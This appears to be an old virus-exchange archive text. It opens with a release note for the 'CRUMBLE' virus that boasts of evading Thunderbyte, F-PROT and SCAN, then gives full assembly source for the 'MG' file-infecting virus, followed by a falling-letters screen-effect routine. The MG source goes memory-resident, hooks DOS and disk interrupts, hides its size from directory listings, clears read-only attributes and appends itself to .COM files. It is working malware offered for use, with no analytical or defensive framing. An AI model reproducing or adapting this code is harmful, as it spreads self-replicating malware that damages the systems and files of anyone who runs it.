

              ************************************************
              CRUMBLE virus - by URNST KOUCH {VIRUS_MAN/DARK
              COFFIN/Crypt}
              ************************************************

              I whacked the CRUMBLE virus in about 5 minutes
              during an evaluation of Phalcon/SKISM's Mass
              Production assembly code generator. CRUMBLE
              is an encrypted, direct-action .COM/.EXE
              infecting virus. It activates every Friday and
              displays my custom 'falling-letters' routine
              on any VGA/CGA monitor.

              CRUMBLE as contained in this archive does not
              scan with THUNDERBYTE, F-PROT 2.04 or SCAN 94b.

              As usual, enjoy your new virus play-thing.

              URNST KOUCH
              VIRUS_MAN BBS 215-PRI-VATE
              DARK COFFIN BBS 215-966-3576


;  Here is the MG virus that someone requested for what ever
;  reason...
;



;        (C) Copyright VirusSoft Corp.  Aug, 1990

         ofs = 201h
         len = offset end-ofs

start:   call  $+6

         org   ofs

first:   dw    020cdh
         db    0

         xchg  ax,dx
         pop   di
         dec   di
         dec   di
         mov   si,[di]
         dec   di
         add   si,di
         cld
         movsw
         movsb

         mov   ax,4b04h
         int   21h
         jnc   residnt

         xor   ax,ax
         mov   es,ax
         mov   di,ofs+3
         mov   cx,len-3
         rep   movsb

         les   di,[6]
         mov   al,0eah
         dec   cx
         repne scasb
         les   di,es:[di]         ; Searching for the INT21 vector
         sub   di,-1ah-7

         db    0eah
         dw    offset jump,0      ; jmp far 0000:jump

jump:    push  es
         pop   ds
         mov   si,[di+3-7]        ;
         lodsb                    ;
         cmp   al,68h             ; compare DOS Ver
         mov   [di+4-7],al        ; Change CMP AH,CS:[????]
         mov   [di+2-7],0fc80h    ;
         mov   [di-7],0fccdh      ;

         push  cs
         pop   ds

         mov   [1020],di          ; int  0ffh
         mov   [1022],es

         mov   beg-1,byte ptr not3_3-beg
         jb    not3.3             ; CY = 0  -->  DOS Ver > or = 3.30
         mov   beg-1,byte ptr 0
         mov   [7b4h],offset pr7b4
         mov   [7b6h],cs          ; 7b4

not3.3:  mov   al,0a9h            ; Change attrib
cont:    repne scasb
         cmp   es:[di],0ffd8h
         jne   cont
         mov   al,18h             ; mov   es:[di],byte ptr 98h
         stosb                    ;

         push  ss
         pop   ds

         push  ss
         pop   es

residnt: xchg  ax,dx
         push  ds                 ; jmp   start
         mov   dx,0100h           ;
         push  dx                 ;
         retf                     ; ret   far

;--------Interrupt process--------;
           
i21pr:   push  ax
         push  dx
         push  ds
         push  cx
         push  bx
         push  es

if4b04:  cmp   ax,4b04h
         je    rti

         xchg  ax,cx
         mov   ah,02fh
         int   0ffh

if11_12: cmp   ch,11h
         je    yes
         cmp   ch,12h
         jne   inffn
yes:     xchg  ax,cx
         int   0ffh
         push  ax
         test  es:byte ptr [bx+19],0c0h
         jz    normal
         sub   es:[bx+36],len
normal:  pop   ax
rti:     pop   es
         pop   bx
         pop   cx
         add   sp,12
         iret

inffn:   mov   ah,19h
         int   0ffh
         push  ax

if36:    cmp   ch,36h             ; -free bytes
         je    beg_36
if4b:    cmp   ch,4bh             ; -exec
         je    beg_4b
if47:    cmp   ch,47h             ; -directory info
         jne   if5b
         cmp   al,2
         jae   begin              ; it's hard-disk
if5b:    cmp   ch,5bh             ; -create new
         je    beg_4b
if3c_3d: shr   ch,1               ; > -open & create
         cmp   ch,1eh             ;   -
         je    beg_4b

         jmp   rest

beg_4b:  mov   ax,121ah
         xchg  dx,si
         int   2fh
         xchg  ax,dx
         xchg  ax,si

beg_36:  mov   ah,0eh             ; change current drive
         dec   dx                 ;
         int   0ffh               ;

begin:
         push  es                 ; save DTA address
         push  bx                 ;
         sub   sp,44
         mov   dx,sp              ; change DTA
         push  sp
         mov   ah,1ah
         push  ss
         pop   ds
         int   0ffh
         push  ds
         pop   es
         mov   bx,dx

         push  cs
         pop   ds

         mov   ah,04eh
         mov   dx,offset file
         mov   cx,3               ; r/o , hidden
         int   0ffh               ; int   21h
         jc    lst

next:    test  es:[bx+21],byte ptr 80h
         jz    true
nxt:     mov   ah,4fh             ; find next
         int   0ffh
         jnc   next
lst:     jmp   last

true:    cmp   es:[bx+27],byte ptr 0fdh
         ja    nxt
         mov   [144],offset i24pr
         mov   [146],cs
           
         push  es
         les   di,[4ch]           ; int 13h
         mov   i13adr,di
         mov   i13adr+2,es
         jmp   short $
beg:     mov   [4ch],offset i13pr
         mov   [4eh],cs
         ;
not3_3:  pop   ds
         push  [bx+22]            ; time +
         push  [bx+24]            ; date +
         push  [bx+21]            ; attrib +
         lea   dx,[bx+30]         ; ds : dx = offset file name
         mov   ax,4301h           ; Change attrib !!!
         pop   cx
         and   cx,0feh            ; clear r/o and CH
         or    cl,0c0h            ; set Infect. attr
         int   0ffh

         mov   ax,03d02h          ; open
         int   0ffh               ; int   21h
         xchg  ax,bx

         push  cs
         pop   ds

         mov   ah,03fh
         mov   cx,3
         mov   dx,offset first
         int   0ffh

         mov   ax,04202h          ; move fp to EOF
         xor   dx,dx
         mov   cx,dx
         int   0ffh
         mov   word ptr cal_ofs+1,ax

         mov   ah,040h
         mov   cx,len
         mov   dx,ofs
         int   0ffh
         jc    not_inf

         mov   ax,04200h
         xor   dx,dx
         mov   cx,dx
         int   0ffh
            
         mov   ah,040h
         mov   cx,3
         mov   dx,offset cal_ofs
         int   0ffh

not_inf: mov   ax,05701h
         pop   dx                 ; date
         pop   cx                 ; time
         int   0ffh

         mov   ah,03eh            ; close
         int   0ffh

         les   ax,dword ptr i13adr
         mov   [4ch],ax           ; int 13h
         mov   [4eh],es

last:    add   sp,46
         pop   dx
         pop   ds                 ; restore DTA
         mov   ah,1ah
         int   0ffh

rest:    pop   dx                 ; restore current drive
         mov   ah,0eh             ;
         int   0ffh               ;

         pop   es
         pop   bx
         pop   cx
         pop   ds
         pop   dx
         pop   ax

i21cl:   iret                     ; Return from INT FC

i24pr:   mov   al,3               ; Critical errors
         iret

i13pr:   cmp   ah,3
         jne   no
         inc   byte ptr cs:activ
         dec   ah
no:      jmp   dword ptr cs:i13adr

pr7b4:         db    2eh,0d0h,2eh
               dw    offset activ
;        shr   cs:activ,1
         jnc   ex7b0
         inc   ah
ex7b0:   jmp   dword ptr cs:[7b0h]

;--------

file:    db    "*.COM"

activ:   db    0

         dw    offset i21pr      ; int 0fch
         dw    0

cal_ofs: db    0e8h

end:
         dw    ?                  ; cal_ofs

i13adr:  dw    ?
         dw    ?

---
Colormem  equ  0B800h    ;Color video mem for page 1
Monomem   equ  0A300h    ;Mon video mem for page 1
Blank     equ  20h

          jmp  Start

Row       dw   24             ;Rows to do initially

;First, get current video mode and page.
Start:    mov  cx,Colormem    ;Assume color display
          mov  ah,15          ;Get current video mode
          int  10h
          cmp  al,2           ;Color?
          je   A2             ;Yes
          cmp  al,3           ;Color?
          je   A2             ;Yes
          cmp  al,7           ;Mono?
          je   A1             ;Yes
          int  20h            ;No,quit

;Come here if 80 col text mode; put video segment in ds.
A1:       mov  cx,Monomem     ;Set for Mono
A2:       mov  bl,0           ;bx=page offset
          add  cx,bx          ;Video segment
          mov  ds,cx          ;in ds

;Now do crumble.
          xor  bx,bx          ;Start at top left corner
A3:       push bx             ;Save row start on stack
          mov  bp,80          ;Reset column counter
;Do next column in a row.
;Give operator a chance to terminate the crumbling.
A4:       mov  ah,0Bh         ;Check if key pressed
          int  21h
          cmp  al,0FFh        ;Key pressed?
          je   A9             ;Yes, quit
;Continue with crumble if no key pressed.
          mov  si,bx          ;Set row top in si
          mov  ax,w[si]       ;Get char & attr from screen
          cmp  al,Blank       ;Is it a blank?
          je   A7             ;Yes, skip it
          mov  dx,ax          ;No, save it in dx
          mov  al,Blank       ;Make it a space
          mov  w[si],ax       ;and put on screen
          add  si,160         ;Set for next row
          mov  di,cs:Row      ;Get rows remaining
A5:       mov  ax,w[si]       ;Get the char & attr from screen
          mov  w[si],dx       ;Put top row char & attr there
A6:       call Vert           ;Wait for 2 vert retraces
          mov  w[si],ax       ;Put original char & attr back
                              ;Do next row, this column.
          add  si,160         ;Next row
          dec  di             ;Done all rows remaining?
          jne  A5             ;No, do next one
          mov  w[si-160],dx   ;Put char & attr on line 25 as junk
;Do next column on this row.
A7:       add  bx,2           ;Next column, same row
          dec  bp             ;Dec column counter; done?
          jne  A4             ;No, do this column
;Do next row.
A8:       pop  bx             ;Get current row start
          add  bx,160         ;Next row
          dec  cs:Row         ;All rows done?
          jne  A3             ;No
A9:       int  20h            ;Yes, quit to DOS

; Sub to wait for 2 vertical retraces to avoid snow on CGA screen.
Vert:     push ax,dx,cx       ;Save all registers used
          mov  cl,2           ;Wait for 2 vert retraces
          mov  dx,3DAh        ;CRT status port
F1:       in   al,dx          ;Read status
          test al,8           ;Vert retrace went hi?
          je   F1             ;No, wait for it
          dec  cl             ;2nd one?
          je   F3             ;Yes, write during blanking time
F2:       in   al,dx          ;No, get status
          test al,8           ;Vert retrace went low?
          jne  F2             ;No, wait for it
          jmp  F1             ;Yes, wait for next hi
F3:       pop  cx,dx,ax       ;Restore registers
          ret                 ;and return

